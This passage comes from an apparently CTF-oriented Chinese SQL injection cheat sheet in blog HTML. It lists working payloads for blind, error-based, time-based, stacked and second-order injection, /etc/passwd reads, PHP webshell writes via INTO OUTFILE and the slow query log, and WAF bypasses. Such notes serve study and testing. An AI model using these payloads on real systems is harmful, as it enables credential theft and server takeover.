<span class="keyword">SELECT</span> GROUP_CONCAT(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> version<span class="operator">=</span><span class="number">10</span>;   <span class="comment">/* 列出当前数据库中的表 */</span></span><br><span class="line"><span class="keyword">SELECT</span> table_schema, table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">!=</span><span class="string">&#x27;information_schema&#x27;</span> <span class="keyword">AND</span> table_schema<span class="operator">!=</span><span class="string">&#x27;mysql&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.tables <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- MySQL8新特性</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">table</span> information_schema.TABLESPACES_EXTENSIONS limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="type">BINARY</span>(<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;0&#x27;</span>)#</span><br></pre></td></tr></table></figure></li><li><p>报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span>(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">null</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">!</span><span class="number">1</span>)x <span class="keyword">GROUP</span> <span class="keyword">BY</span> CONCAT((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables LIMIT <span class="number">1</span>),<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))) (@:<span class="operator">=</span><span class="number">1</span>)<span class="operator">||</span>@ <span class="keyword">GROUP</span> <span class="keyword">BY</span> CONCAT((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables LIMIT <span class="number">1</span>),<span class="operator">!</span>@) <span class="keyword">HAVING</span> @<span class="operator">||</span><span class="built_in">MIN</span>(@:<span class="operator">=</span><span class="number">0</span>); <span class="keyword">AND</span> ExtractValue(<span class="number">1</span>, CONCAT(<span class="number">0x5c</span>, (<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables LIMIT <span class="number">1</span>)));</span><br><span class="line"><span class="comment">-- 在5.1.5版本中成功。</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>列名（字段名）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name),<span class="number">4</span>,xxxx <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>(table_name) <span class="comment">/*此处的表名为字符串型，也通过十六进制表示*/</span></span><br></pre></td></tr></table></figure><ul><li><p>union查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> GROUP_CONCAT(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;tablename&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(column_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.columns <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 在5.1.5版本中成功</span></span><br><span class="line"><span class="keyword">AND</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> SOME_EXISTING_TABLE <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> LIMIT <span class="number">1</span>)</span><br><span class="line"><span class="comment">-- MySQL 5.1版本修复了</span></span><br><span class="line"><span class="keyword">AND</span>(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">null</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">!</span><span class="number">1</span>)x <span class="keyword">GROUP</span> <span class="keyword">BY</span> CONCAT((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns LIMIT <span class="number">1</span>),<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))) (@:<span class="operator">=</span><span class="number">1</span>)<span class="operator">||</span>@ <span class="keyword">GROUP</span> <span class="keyword">BY</span> CONCAT((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns LIMIT <span class="number">1</span>),<span class="operator">!</span>@) <span class="keyword">HAVING</span> @<span class="operator">||</span><span class="built_in">MIN</span>(@:<span class="operator">=</span><span class="number">0</span>); <span class="keyword">AND</span> ExtractValue(<span class="number">1</span>, CONCAT(<span class="number">0x5c</span>, (<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns LIMIT <span class="number">1</span>)));</span><br></pre></td></tr></table></figure></li></ul></li><li><p>值查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,column_name,<span class="number">4</span>,xxx <span class="keyword">from</span> (database_name.)table_name</span><br><span class="line"></span><br><span class="line"><span class="comment">-- MySQL8新特性</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">table</span> flag limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="type">BINARY</span>(<span class="string">&#x27;a&#x27;</span>))#</span><br></pre></td></tr></table></figure></li></ul><h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><ul><li><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><ul><li><h6 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h6><p>使用场景：<strong>对真/假条件返回的内容很容易区分</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">where</span> <span class="operator">|</span> <span class="keyword">and</span>) if(substr((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>nouser <span class="keyword">or</span> length(database())<span class="operator">&gt;</span><span class="number">8</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>nouser <span class="keyword">or</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">130</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 通配符</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;xxx&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> passwd <span class="keyword">like</span> <span class="string">&#x27;&#123;&#125;%&#x27;</span>#</span><br></pre></td></tr></table></figure></li><li><h6 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h6><p>依赖于通过<strong>页面返回的延迟时间</strong>来判断条件是否正确。</p><p>通常可利用的产生时间延迟的函数有：<strong>sleep()、benchmark()</strong>，还有许多进行<strong>复杂运算的函数</strong>也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- sleep()</span></span><br><span class="line">(<span class="keyword">where</span> <span class="operator">|</span> <span class="keyword">and</span>) if(substr((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>$username (<span class="keyword">and</span> <span class="operator">|</span> <span class="keyword">or</span>) if(length(database())<span class="operator">&gt;</span><span class="number">8</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- benchmark()</span></span><br><span class="line"><span class="keyword">or</span> benchmark(<span class="number">5000000</span>,md5(<span class="string">&#x27;test&#x27;</span>))</span><br><span class="line"><span class="keyword">or</span> if(length(database())<span class="operator">&gt;</span><span class="number">5</span>,benchmark(<span class="number">1500000</span>,md5(<span class="string">&#x27;test&#x27;</span>)),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- pg_sleep()</span></span><br><span class="line">(<span class="keyword">and</span> <span class="operator">|</span> <span class="keyword">or</span>) (<span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">select</span> substr(password,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> users)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">then</span> pg_sleep(<span class="number">5</span>) <span class="keyword">else</span> pg_sleep(<span class="number">0</span>) <span class="keyword">end</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span>(substr((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>) <span class="keyword">then</span> (<span class="keyword">select</span> <span class="string">&#x27;roarctf&#x27;</span> <span class="keyword">from</span> pg_sleep(<span class="number">3</span>)) <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">end</span>)<span class="operator">=</span><span class="string">&#x27;roarctf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 笛卡尔积 heavy query</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns A, information_schema.columns B, information_schema.columns C);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(<span class="number">1</span>,concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span>,<span class="number">0</span>) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>通过<strong>特殊函数</strong>的错误使用使其参数被页面输出。</p><p>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。</p><p>常见的利用函数有：<code>exp()、floor()+rand()、updatexml()、extractvalue()</code>等。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) pow(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a),<span class="number">9999</span>);</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>));</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>,<span class="built_in">ceil</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br></pre></td></tr></table></figure></li><li><h5 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h5><p>使用 <code>PROCEDURE</code>函数进行注入，ANALYSE支持两个参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select id from users order by id desc limit 0,1 procedure analyse(1,1);</span><br><span class="line">select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line">select id from users order by id desc limit 0,1 into outfile &quot;/var/www/html/1.php&quot; LINES TERMINATED BY 0x16进制文件</span><br></pre></td></tr></table></figure></li><li><h5 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#盲注</span><br><span class="line">update users set username = &#x27;0&#x27;|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;</span><br><span class="line">update users set username = &#x27;0&#x27; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14;</span><br><span class="line">update users set id = &#x27;1&#x27; where username like &#x27;f%&#x27; || sleep(5);</span><br></pre></td></tr></table></figure></li><li><h5 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#盲注</span><br><span class="line">insert into users values (16,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));</span><br><span class="line">insert into users values (15,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d));</span><br></pre></td></tr></table></figure></li><li><h5 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#报错注入</span><br><span class="line">select * from users order by updatexml(1,concat(0x7e,(select%20user()),0x7e),1);</span><br><span class="line"></span><br><span class="line">#盲注</span><br><span class="line">select * from users order by id ^(select(select version()) regexp &#x27;^5&#x27;);</span><br></pre></td></tr></table></figure></li><li><h5 id="group-by注入"><a href="#group-by注入" class="headerlink" title="group by注入"></a>group by注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#盲注</span><br><span class="line">select * from users group by 1 having substr((select database()),1,1)=&#x27;c&#x27;</span><br></pre></td></tr></table></figure></li></ul><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>国内最常使用的 GBK 编码，这种方式主要是绕过 <code>addslashes</code> 等对特殊字符进行转移的绕过。反斜杠 <code>\</code> 的十六进制为 <code>%5c</code>，在你输入 <code>%bf%27</code> 时，函数遇到单引号自动转移加入 <code>\</code>，此时变为 <code>%bf%5c%27</code>，<code>%bf%5c</code> 在 GBK 中变为一个宽字符「縗」。<strong><code>%bf</code></strong> 那个位置可以是 <code>%81-%fe</code> 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。</p><p>GET方式：利用URLencode <code>?id=1%df&#39;||1=&#123;payload&#125;%23</code></p><p>POST方式：利用UTF-16或UTF-32或中文 <code>?id=1我&#39;||1=&#123;payload&#125;#</code></p><p>​</p><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>由于分号<code>;</code>为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如<code>RENAME</code>、<code>DROP</code>等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;#</span><br><span class="line">1;show tables;#</span><br><span class="line">1;show columns from [表名];#</span><br><span class="line"></span><br><span class="line">1;update`ctfshow_user`set`pass`=(0x31323334)where(username=0x61646d696e)</span><br><span class="line"></span><br><span class="line">/*预处理*/</span><br><span class="line">1;PREPARE hacker from char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);EXECUTE hacker;#</span><br><span class="line">1;PREPARE hacker from 0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;EXECUTE hacker;#</span><br><span class="line"></span><br><span class="line">1&#x27;;SET @sqli=char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br><span class="line">1&#x27;;SET @sqli=0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>攻击者构造的恶意数据存储到数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。</p><blockquote><p>现在通常Web应用程序大多都会进行参数过滤，来防止注入。如果某处使用了urldecode()或者 rawurldecode()函数，则会导致二次解码生成单引号二引发注入，即二次注入。</p><p>Web应用程序通常使用addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数或者开启GPC来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。</p><p>addslashes函数虽然在过滤之后会添加 “\” 进行转义，但是 “\” 并不会被带到数据库中</p></blockquote><ul><li><h5 id="二次urldecode注入"><a href="#二次urldecode注入" class="headerlink" title="二次urldecode注入"></a>二次urldecode注入</h5><p>单引号：<code>%25%27</code></p><p>双引号：<code>%25%22</code></p></li></ul><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p><strong>读文件</strong></p><p><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;)</code></p><p><code>SELECT LOAD_FILE(0x2f666c6167)</code></p><p><strong>写文件</strong></p><p><code>SELECT &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/phpinfo.php&#39;</code></p><p><code>select version() into outfile &quot;/var/www/html/test.php&quot; LINES TERMINATED BY 0x16进制文件</code></p><p><strong>慢查询注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_query_log_file=&#x27;/var/www/html/shell.php&#x27;;</span><br><span class="line">select &#x27;&lt;?php eval($_GET[a])?&gt;&#x27; or SLEEP(11);</span><br></pre></td></tr></table></figure><p>​</p><h4 id="Rogue-Mysql-Server"><a href="#Rogue-Mysql-Server" class="headerlink" title="Rogue Mysql Server"></a>Rogue Mysql Server</h4><p>搭建恶意mysql服务器读取文件。</p><p><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><p>​</p><h4 id="Quine"><a href="#Quine" class="headerlink" title="Quine"></a>Quine</h4><p>Quine又叫做自产生程序，在sql注入技术中，这是一种使得输入的sql语句和输出的sql语句一致的技术，常用于一些特殊的登陆绕过sql注入中。</p><p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253570">从三道赛题再谈Quine trick</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;</span><span class="number">1</span>&quot;UNION(SELECT(REPLACE(REPLACE(&quot;<span class="operator">%</span>&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;<span class="operator">%</span>&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;<span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(REPLACE(REPLACE(&quot;%&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">37</span>),&quot;%&quot;)))#<span class="string">&#x27;)))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- CHAR =&gt; 0x</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="绕过（bypass）"><a href="#绕过（bypass）" class="headerlink" title="绕过（bypass）"></a>绕过（bypass）</h3><h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><ol><li>多层括号嵌套</li><li>改用+号</li><li>使用注释代替（/*注释内容*/、/*! MYSQL专属*/）</li><li><code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格</li></ol><h4 id="单双引号"><a href="#单双引号" class="headerlink" title="单双引号"></a>单双引号</h4><ol><li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。</li><li>不需要跳出单引号的情况：字符串可用<strong>16进制</strong>表示、也可通过进制转换函数表示成其他进制。</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- hex 编码</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="number">0x61646D696E</span></span><br><span class="line"><span class="comment">-- char() 函数</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="type">CHAR</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)</span><br></pre></td></tr></table></figure><h4 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h4><ol><li>采用 <code>substr((database())from(&#123;&#125;)for(1))</code> 的形式</li><li>采用join：<code>union select * from ((select 1)a join (select 2)b join (select 3)c);</code></li></ol><h4 id="等号"><a href="#等号" class="headerlink" title="等号"></a>等号</h4><ol><li><code>like</code></li><li>用<code>regexp</code>或者<code>in</code></li><li><code>&lt;&gt;</code></li></ol><h4 id="分号"><a href="#分号" class="headerlink" title="分号"></a>分号</h4><ol><li>换行 <code>%0a</code></li><li>改变输入结束符：<code>delimiter</code></li></ol><h4 id="and-or"><a href="#and-or" class="headerlink" title="and / or"></a>and / 